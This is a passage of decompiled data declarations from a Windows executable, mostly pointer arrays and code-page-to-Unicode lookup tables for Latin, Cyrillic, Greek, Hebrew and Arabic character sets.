  &off_4060F4,
  &off_4060FC,
  &off_406104,
  &off_40610C,
  &off_406114,
  &off_40611C,
  &off_406124,
  &off_40612C,
  &off_406134,
  &off_40613C,
  &off_406144,
  &off_40614C,
  &off_406154,
  &off_40615C,
  &off_406164,
  &off_40616C,
  &off_406174,
  &off_40617C,
  &off_406184
}; // weak
int **off_41C190[26] =
{
  &off_4060BC,
  &off_4060C4,
  &off_4060CC,
  &off_4060D4,
  &off_4060DC,
  &off_4060E4,
  &off_4060EC,
  &off_4060F4,
  &off_4060FC,
  &off_406104,
  &off_40610C,
  &off_406114,
  &off_40611C,
  &off_406124,
  &off_40612C,
  &off_406134,
  &off_40613C,
  &off_406144,
  &off_40614C,
  &off_406154,
  &off_40615C,
  &off_406164,
  &off_40616C,
  &off_406174,
  &off_40617C,
  &off_406184
}; // weak
int **off_41C1C0[14] =
{
  &off_40611C,
  &off_406124,
  &off_40612C,
  &off_406134,
  &off_40613C,
  &off_406144,
  &off_40614C,
  &off_406154,
  &off_40615C,
  &off_406164,
  &off_40616C,
  &off_406174,
  &off_40617C,
  &off_406184
}; // weak
int **off_41C1DC[7] =
{
  &off_406154,
  &off_40615C,
  &off_406164,
  &off_40616C,
  &off_406174,
  &off_40617C,
  &off_406184
}; // weak
int dword_41C1F8[] = { 2 }; // weak
int dword_41C218[] = { 100 }; // weak
int (*off_41C230)[3] = &dword_4064C8; // weak
_DWORD *dword_41C2E0 = NULL; // idb
char *off_41C2E4 = "False"; // weak
int (*off_41C2F0)[4] = &dword_40E504; // weak
int (*off_41C2F8)[4] = &dword_40EAFC; // weak
_WORD word_41C300[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  161,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  170,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  186,
  187,
  188,
  189,
  190,
  191,
  192,
  193,
  194,
  195,
  196,
  197,
  198,
  199,
  200,
  201,
  202,
  203,
  204,
  205,
  206,
  207,
  208,
  209,
  210,
  211,
  212,
  213,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  221,
  222,
  223,
  224,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  240,
  241,
  242,
  243,
  244,
  245,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  253,
  254,
  255
}; // idb
_WORD word_41C400[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  260,
  728,
  321,
  164,
  317,
  346,
  167,
  168,
  352,
  350,
  356,
  377,
  173,
  381,
  379,
  176,
  261,
  731,
  322,
  180,
  318,
  347,
  711,
  184,
  353,
  351,
  357,
  378,
  733,
  382,
  380,
  340,
  193,
  194,
  258,
  196,
  313,
  262,
  199,
  268,
  201,
  280,
  203,
  282,
  205,
  206,
  270,
  272,
  323,
  327,
  211,
  212,
  336,
  214,
  215,
  344,
  366,
  218,
  368,
  220,
  221,
  354,
  223,
  341,
  225,
  226,
  259,
  228,
  314,
  263,
  231,
  269,
  233,
  281,
  235,
  283,
  237,
  238,
  271,
  273,
  324,
  328,
  243,
  244,
  337,
  246,
  247,
  345,
  367,
  250,
  369,
  252,
  253,
  355,
  729
}; // idb
_WORD word_41C500[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  294,
  728,
  163,
  164,
  -3,
  292,
  167,
  168,
  304,
  350,
  286,
  308,
  173,
  -3,
  379,
  176,
  295,
  178,
  179,
  180,
  181,
  293,
  183,
  184,
  305,
  351,
  287,
  309,
  189,
  -3,
  380,
  192,
  193,
  194,
  -3,
  196,
  266,
  264,
  199,
  200,
  201,
  202,
  203,
  204,
  205,
  206,
  207,
  -3,
  209,
  210,
  211,
  212,
  288,
  214,
  215,
  284,
  217,
  218,
  219,
  220,
  364,
  348,
  223,
  224,
  225,
  226,
  -3,
  228,
  267,
  265,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  -3,
  241,
  242,
  243,
  244,
  289,
  246,
  247,
  285,
  249,
  250,
  251,
  252,
  365,
  349,
  729
}; // idb
_WORD word_41C600[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  260,
  312,
  342,
  164,
  296,
  315,
  167,
  168,
  352,
  274,
  290,
  358,
  173,
  381,
  175,
  176,
  261,
  731,
  343,
  180,
  297,
  316,
  711,
  184,
  353,
  275,
  291,
  359,
  330,
  382,
  331,
  256,
  193,
  194,
  195,
  196,
  197,
  198,
  302,
  268,
  201,
  280,
  203,
  278,
  205,
  206,
  298,
  272,
  325,
  332,
  310,
  212,
  213,
  214,
  215,
  216,
  370,
  218,
  219,
  220,
  360,
  362,
  223,
  257,
  225,
  226,
  227,
  228,
  229,
  230,
  303,
  269,
  233,
  281,
  235,
  279,
  237,
  238,
  299,
  273,
  326,
  333,
  311,
  244,
  245,
  246,
  247,
  248,
  371,
  250,
  251,
  252,
  361,
  363,
  729
}; // idb
_WORD word_41C700[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  1025,
  1026,
  1027,
  1028,
  1029,
  1030,
  1031,
  1032,
  1033,
  1034,
  1035,
  1036,
  173,
  1038,
  1039,
  1040,
  1041,
  1042,
  1043,
  1044,
  1045,
  1046,
  1047,
  1048,
  1049,
  1050,
  1051,
  1052,
  1053,
  1054,
  1055,
  1056,
  1057,
  1058,
  1059,
  1060,
  1061,
  1062,
  1063,
  1064,
  1065,
  1066,
  1067,
  1068,
  1069,
  1070,
  1071,
  1072,
  1073,
  1074,
  1075,
  1076,
  1077,
  1078,
  1079,
  1080,
  1081,
  1082,
  1083,
  1084,
  1085,
  1086,
  1087,
  1088,
  1089,
  1090,
  1091,
  1092,
  1093,
  1094,
  1095,
  1096,
  1097,
  1098,
  1099,
  1100,
  1101,
  1102,
  1103,
  8470,
  1105,
  1106,
  1107,
  1108,
  1109,
  1110,
  1111,
  1112,
  1113,
  1114,
  1115,
  1116,
  167,
  1118,
  1119
}; // idb
_WORD word_41C800[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  -3,
  -3,
  -3,
  164,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  1548,
  173,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  1563,
  -3,
  -3,
  -3,
  1567,
  -3,
  1569,
  1570,
  1571,
  1572,
  1573,
  1574,
  1575,
  1576,
  1577,
  1578,
  1579,
  1580,
  1581,
  1582,
  1583,
  1584,
  1585,
  1586,
  1587,
  1588,
  1589,
  1590,
  1591,
  1592,
  1593,
  1594,
  -3,
  -3,
  -3,
  -3,
  -3,
  1600,
  1601,
  1602,
  1603,
  1604,
  1605,
  1606,
  1607,
  1608,
  1609,
  1610,
  1611,
  1612,
  1613,
  1614,
  1615,
  1616,
  1617,
  1618,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3
}; // idb
_WORD word_41C900[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  8216,
  8217,
  163,
  -3,
  -3,
  166,
  167,
  168,
  169,
  -3,
  171,
  172,
  173,
  -3,
  8213,
  176,
  177,
  178,
  179,
  900,
  901,
  902,
  183,
  904,
  905,
  906,
  187,
  908,
  189,
  910,
  911,
  912,
  913,
  914,
  915,
  916,
  917,
  918,
  919,
  920,
  921,
  922,
  923,
  924,
  925,
  926,
  927,
  928,
  929,
  -3,
  931,
  932,
  933,
  934,
  935,
  936,
  937,
  938,
  939,
  940,
  941,
  942,
  943,
  944,
  945,
  946,
  947,
  948,
  949,
  950,
  951,
  952,
  953,
  954,
  955,
  956,
  957,
  958,
  959,
  960,
  961,
  962,
  963,
  964,
  965,
  966,
  967,
  968,
  969,
  970,
  971,
  972,
  973,
  974,
  -3
}; // idb
_WORD word_41CA00[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  -3,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  215,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  247,
  187,
  188,
  189,
  190,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  8215,
  1488,
  1489,
  1490,
  1491,
  1492,
  1493,
  1494,
  1495,
  1496,
  1497,
  1498,
  1499,
  1500,
  1501,
  1502,
  1503,
  1504,
  1505,
  1506,
  1507,
  1508,
  1509,
  1510,
  1511,
  1512,
  1513,
  1514,
  -3,
  -3,
  8206,
  8207,
  -3
}; // idb
_WORD word_41CB00[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  260,
  728,
  321,
  164,
  317,
  346,
  167,
  168,
  352,
  350,
  356,
  377,
  173,
  381,
  379,
  176,
  261,
  731,
  322,
  180,
  318,
  347,
  711,
  184,
  353,
  351,
  357,
  378,
  733,
  382,
  380,
  340,
  193,
  194,
  258,
  196,
  313,
  262,
  199,
  268,
  201,
  280,
  203,
  282,
  205,
  206,
  270,
  286,
  209,
  210,
  211,
  212,
  213,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  304,
  350,
  223,
  224,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  287,
  241,
  242,
  243,
  244,
  245,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  305,
  351,
  255
}; // idb
_WORD word_41CC00[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  260,
  274,
  290,
  298,
  296,
  310,
  167,
  315,
  272,
  352,
  358,
  381,
  173,
  362,
  330,
  176,
  261,
  275,
  291,
  299,
  297,
  311,
  183,
  316,
  273,
  353,
  359,
  382,
  8213,
  363,
  331,
  256,
  193,
  194,
  195,
  196,
  197,
  198,
  302,
  268,
  201,
  280,
  203,
  278,
  205,
  206,
  207,
  208,
  325,
  332,
  211,
  212,
  213,
  214,
  360,
  216,
  370,
  218,
  219,
  220,
  221,
  222,
  223,
  257,
  225,
  226,
  227,
  228,
  229,
  230,
  303,
  269,
  233,
  281,
  235,
  279,
  237,
  238,
  239,
  240,
  326,
  333,
  243,
  244,
  245,
  246,
  361,
  248,
  371,
  250,
  251,
  252,
  253,
  254,
  312
}; // idb
_WORD word_41CD00[128] =
{
  8364,
  -3,
  8218,
  -3,
  8222,
  8230,
  8224,
  8225,
  -3,
  8240,
  352,
  8249,
  346,
  356,
  381,
  377,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  -3,
  8482,
  353,
  8250,
  347,
  357,
  382,
  378,
  160,
  711,
  728,
  321,
  164,
  260,
  166,
  167,
  168,
  169,
  350,
  171,
  172,
  173,
  174,
  379,
  176,
  177,
  731,
  322,
  180,
  181,
  182,
  183,
  184,
  261,
  351,
  187,
  317,
  733,
  318,
  380,
  340,
  193,
  194,
  258,
  196,
  313,
  262,
  199,
  268,
  201,
  280,
  203,
  282,
  205,
  206,
  270,
  272,
  323,
  327,
  211,
  212,
  336,
  214,
  215,
  344,
  366,
  218,
  368,
  220,
  221,
  354,
  223,
  341,
  225,
  226,
  259,
  228,
  314,
  263,
  231,
  269,
  233,
  281,
  235,
  283,
  237,
  238,
  271,
  273,
  324,
  328,
  243,
  244,
  337,
  246,
  247,
  345,
  367,
  250,
  369,
  252,
  253,
  355,
  729
}; // idb
_WORD word_41CE00[128] =
{
  1026,
  1027,
  8218,
  1107,
  8222,
  8230,
  8224,
  8225,
  8364,
  8240,
  1033,
  8249,
  1034,
  1036,
  1035,
  1039,
  1106,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  -3,
  8482,
  1113,
  8250,
  1114,
  1116,
  1115,
  1119,
  160,
  1038,
  1118,
  1032,
  164,
  1168,
  166,
  167,
  1025,
  169,
  1028,
  171,
  172,
  173,
  174,
  1031,
  176,
  177,
  1030,
  1110,
  1169,
  181,
  182,
  183,
  1105,
  8470,
  1108,
  187,
  1112,
  1029,
  1109,
  1111,
  1040,
  1041,
  1042,
  1043,
  1044,
  1045,
  1046,
  1047,
  1048,
  1049,
  1050,
  1051,
  1052,
  1053,
  1054,
  1055,
  1056,
  1057,
  1058,
  1059,
  1060,
  1061,
  1062,
  1063,
  1064,
  1065,
  1066,
  1067,
  1068,
  1069,
  1070,
  1071,
  1072,
  1073,
  1074,
  1075,
  1076,
  1077,
  1078,
  1079,
  1080,
  1081,
  1082,
  1083,
  1084,
  1085,
  1086,
  1087,
  1088,
  1089,
  1090,
  1091,
  1092,
  1093,
  1094,
  1095,
  1096,
  1097,
  1098,
  1099,
  1100,
  1101,
  1102,
  1103
}; // idb
_WORD word_41CF00[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  352,
  8249,
  338,
  -3,
  381,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  353,
  8250,
  339,
  -3,
  382,
  376,
  160,
  161,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  170,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  186,
  187,
  188,
  189,
  190,
  191,
  192,
  193,
  194,
  195,
  196,
  197,
  198,
  199,
  200,
  201,
  202,
  203,
  204,
  205,
  206,
  207,
  208,
  209,
  210,
  211,
  212,
  213,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  221,
  222,
  223,
  224,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  240,
  241,
  242,
  243,
  244,
  245,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  253,
  254,
  255
}; // idb
_WORD word_41D000[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  -3,
  8240,
  -3,
  8249,
  -3,
  -3,
  -3,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  -3,
  8482,
  -3,
  8250,
  -3,
  -3,
  -3,
  -3,
  160,
  901,
  902,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  -3,
  171,
  172,
  173,
  174,
  8213,
  176,
  177,
  178,
  179,
  900,
  181,
  182,
  183,
  904,
  905,
  906,
  187,
  908,
  189,
  910,
  911,
  912,
  913,
  914,
  915,
  916,
  917,
  918,
  919,
  920,
  921,
  922,
  923,
  924,
  925,
  926,
  927,
  928,
  929,
  -3,
  931,
  932,
  933,
  934,
  935,
  936,
  937,
  938,
  939,
  940,
  941,
  942,
  943,
  944,
  945,
  946,
  947,
  948,
  949,
  950,
  951,
  952,
  953,
  954,
  955,
  956,
  957,
  958,
  959,
  960,
  961,
  962,
  963,
  964,
  965,
  966,
  967,
  968,
  969,
  970,
  971,
  972,
  973,
  974,
  -3
}; // idb
_WORD word_41D100[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  352,
  8249,
  338,
  -3,
  -3,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  353,
  8250,
  339,
  -3,
  -3,
  376,
  160,
  161,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  170,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  186,
  187,
  188,
  189,
  190,
  191,
  192,
  193,
  194,
  195,
  196,
  197,
  198,
  199,
  200,
  201,
  202,
  203,
  204,
  205,
  206,
  207,
  286,
  209,
  210,
  211,
  212,
  213,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  304,
  350,
  223,
  224,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  287,
  241,
  242,
  243,
  244,
  245,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  305,
  351,
  255
}; // idb
_WORD word_41D200[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  -3,
  8249,
  -3,
  -3,
  -3,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  -3,
  8250,
  -3,
  -3,
  -3,
  -3,
  160,
  161,
  162,
  163,
  8362,
  165,
  166,
  167,
  168,
  169,
  215,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  247,
  187,
  188,
  189,
  190,
  191,
  1456,
  1457,
  1458,
  1459,
  1460,
  1461,
  1462,
  1463,
  1464,
  1465,
  -3,
  1467,
  1468,
  1469,
  1470,
  1471,
  1472,
  1473,
  1474,
  1475,
  1520,
  1521,
  1522,
  1523,
  1524,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  1488,
  1489,
  1490,
  1491,
  1492,
  1493,
  1494,
  1495,
  1496,
  1497,
  1498,
  1499,
  1500,
  1501,
  1502,
  1503,
  1504,
  1505,
  1506,
  1507,
  1508,
  1509,
  1510,
  1511,
  1512,
  1513,
  1514,
  -3,
  -3,
  8206,
  8207,
  -3
}; // idb
_WORD word_41D300[128] =
{
  8364,
  1662,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  1657,
  8249,
  338,
  1670,
  1688,
  1672,
  1711,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  1705,
  8482,
  1681,
  8250,
  339,
  8204,
  8205,
  1722,
  160,
  1548,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  1726,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  1563,
  187,
  188,
  189,
  190,
  1567,
  1729,
  1569,
  1570,
  1571,
  1572,
  1573,
  1574,
  1575,
  1576,
  1577,
  1578,
  1579,
  1580,
  1581,
  1582,
  1583,
  1584,
  1585,
  1586,
  1587,
  1588,
  1589,
  1590,
  215,
  1591,
  1592,
  1593,
  1594,
  1600,
  1601,
  1602,
  1603,
  224,
  1604,
  226,
  1605,
  1606,
  1607,
  1608,
  231,
  232,
  233,
  234,
  235,
  1609,
  1610,
  238,
  239,
  1611,
  1612,
  1613,
  1614,
  244,
  1615,
  1616,
  247,
  1617,
  249,
  1618,
  251,
  252,
  8206,
  8207,
  1746
}; // idb
_WORD word_41D400[128] =
{
  8364,
  -3,
  8218,
  -3,
  8222,
  8230,
  8224,
  8225,
  -3,
  8240,
  -3,
  8249,
  -3,
  168,
  711,
  184,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  -3,
  8482,
  -3,
  8250,
  -3,
  175,
  731,
  -3,
  160,
  -3,
  162,
  163,
  164,
  -3,
  166,
  167,
  216,
  169,
  342,
  171,
  172,
  173,
  174,
  198,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  248,
  185,
  343,
  187,
  188,
  189,
  190,
  230,
  260,
  302,
  256,
  262,
  196,
  197,
  280,
  274,
  268,
  201,
  377,
  278,
  290,
  310,
  298,
  315,
  352,
  323,
  325,
  211,
  332,
  213,
  214,
  215,
  370,
  321,
  346,
  362,
  220,
  379,
  381,
  223,
  261,
  303,
  257,
  263,
  228,
  229,
  281,
  275,
  269,
  233,
  378,
  279,
  291,
  311,
  299,
  316,
  353,
  324,
  326,
  243,
  333,
  245,
  246,
  247,
  371,
  322,
  347,
  363,
  252,
  380,
  382,
  729
}; // idb
_WORD word_41D500[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  -3,
  8249,
  338,
  -3,
  -3,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  -3,
  8250,
  339,
  -3,
  -3,
  376,
  160,
  161,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  170,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  186,
  187,
  188,
  189,
  190,
  191,
  192,
  193,
  194,
  258,
  196,
  197,
  198,
  199,
  200,
  201,
  202,
  203,
  768,
  205,
  206,
  207,
  272,
  209,
  777,
  211,
  212,
  416,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  431,
  771,
  223,
  224,
  225,
  226,
  259,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  769,
  237,
  238,
  239,
  273,
  241,
  803,
  243,
  244,
  417,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  432,
  8363,
  255
}; // idb
_WORD word_41D600[128] =
{
  9472,
  9474,
  9484,
  9488,
  9492,
  9496,
  9500,
  9508,
  9516,
  9524,
  9532,
  9600,
  9604,
  9608,
  9612,
  9616,
  9617,
  9618,
  9619,
  8992,
  9632,
  8729,
  8730,
  8776,
  8804,
  8805,
  160,
  8993,
  176,
  178,
  183,
  247,
  9552,
  9553,
  9554,
  1105,
  9555,
  9556,
  9557,
  9558,
  9559,
  9560,
  9561,
  9562,
  9563,
  9564,
  9565,
  9566,
  9567,
  9568,
  9569,
  1025,
  9570,
  9571,
  9572,
  9573,
  9574,
  9575,
  9576,
  9577,
  9578,
  9579,
  9580,
  169,
  1102,
  1072,
  1073,
  1094,
  1076,
  1077,
  1092,
  1075,
  1093,
  1080,
  1081,
  1082,
  1083,
  1084,
  1085,
  1086,
  1087,
  1103,
  1088,
  1089,
  1090,
  1091,
  1078,
  1074,
  1100,
  1099,
  1079,
  1096,
  1101,
  1097,
  1095,
  1098,
  1070,
  1040,
  1041,
  1062,
  1044,
  1045,
  1060,
  1043,
  1061,
  1048,
  1049,
  1050,
  1051,
  1052,
  1053,
  1054,
  1055,
  1071,
  1056,
  1057,
  1058,
  1059,
  1046,
  1042,
  1068,
  1067,
  1047,
  1064,
  1069,
  1065,
  1063,
  1066
}; // idb
_UNKNOWN unk_41D700; // weak
int (*off_41D720)[21] = &dword_411034; // weak
int (*off_41D73C)[34] = &dword_411088; // weak
int (*off_41D76C)[21] = &dword_4116E4; // weak
int dword_41D830 = 0; // weak
char byte_41D836 = '\x01'; // weak
char aMsSansSerif[15] = "\rMS Sans Serif"; // weak
OLECHAR *dword_41D858 = NULL; // idb
OLECHAR *dword_41D9A8 = NULL; // idb
__int16 word_41DA38[8] = { 0, 1, 2, 3, 4, 5, 6, -16245 }; // idb
__int16 word_41DA48[16] = { 1, 16, 11, 6, 13, 4, 14, 5, 12, 3, 15, 2, 9, 8, 7, 10 }; // idb
int dword_41DA68 = 0; // weak
int dword_41DA6C = 0; // weak
int dword_41DA70 = 0; // weak
BYTE byte_41DA74[64] =
{
  0u,
  0u,
  0u,
  0u,
  128u,
  0u,
  0u,
  0u,
  0u,
  128u,
  0u,
  0u,
  128u,
  128u,
  0u,
  0u,
  0u,
  0u,
  128u,
  0u,
  128u,
  0u,
  128u,
  0u,
  0u,
  128u,
  128u,
  0u,
  128u,
  128u,
  128u,
  0u,
  192u,
  192u,
  192u,
  0u,
  255u,
  0u,
  0u,
  0u,
  0u,
  255u,
  0u,
  0u,
  255u,
  255u,
  0u,
  0u,
  0u,
  0u,
  255u,
  0u,
  255u,
  0u,
  255u,
  0u,
  0u,
  255u,
  255u,
  0u,
  255u,
  255u,
  255u,
  0u
}; // idb
int *off_41DAD4 = &dword_41E018; // weak
int **off_41DAD8[2] = { &off_406014, &off_40617C }; // weak
int *off_41DAE0 = &dword_41E004; // weak
int **off_41DAE8[7] =
{
  &off_40604C,
  &off_40607C,
  &off_40B43C,
  &off_405F3C,
  &off_40615C,
  &off_40613C,
  &off_406164
}; // weak
int **off_41DAF0[5] = { &off_40B43C, &off_405F3C, &off_40615C, &off_40613C, &off_406164 }; // weak
void *off_41DB04 = &unk_41E010; // weak
int *off_41DB08[10] =
{
  &off_405F0C,
  &off_405FBC,
  &off_405F04,
  &off_40609C,
  &off_405F44,
  &off_405FC4,
  &off_40603C,
  &off_40B414,
  &off_40B434,
  &off_4060EC
}; // weak
int *off_41DB0C[9] =
{
  &off_405FBC,
  &off_405F04,
  &off_40609C,
  &off_405F44,
  &off_405FC4,
  &off_40603C,
  &off_40B414,
  &off_40B434,
  &off_4060EC
}; // weak
int *off_41DB10[8] =
{
  &off_405F04,
  &off_40609C,
  &off_405F44,
  &off_405FC4,
  &off_40603C,
  &off_40B414,
  &off_40B434,
  &off_4060EC
}; // weak
int *off_41DB20[4] = { &off_40603C, &off_40B414, &off_40B434, &off_4060EC }; // weak
int *off_41DB24[3] = { &off_40B414, &off_40B434, &off_4060EC }; // weak
int (*off_41DB30)[115] = &dword_41E214; // weak
void *off_41DB38 = &unk_41E570; // weak
void *off_41DB48 = &unk_41E008; // weak
int *off_41DB54[2] = { &dword_41E000, &dword_41E00C }; // weak
int *off_41DB58 = &dword_41E00C; // weak
void *off_41DB5C = &unk_41E510; // weak
int **off_41DB70[32] =
{
  &off_40B454,
  &off_40614C,
  &off_405F14,
  &off_405F5C,
  &off_405FCC,
  &off_40B46C,
  &off_405FFC,
  &off_4060BC,
  &off_40B40C,
  &off_40B404,
  &off_406024,
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DB84[27] =
{
  &off_40B46C,
  &off_405FFC,
  &off_4060BC,
  &off_40B40C,
  &off_40B404,
  &off_406024,
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DB90[24] =
{
  &off_40B40C,
  &off_40B404,
  &off_406024,
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DB94[23] =
{
  &off_40B404,
  &off_406024,
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DB9C[21] =
{
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
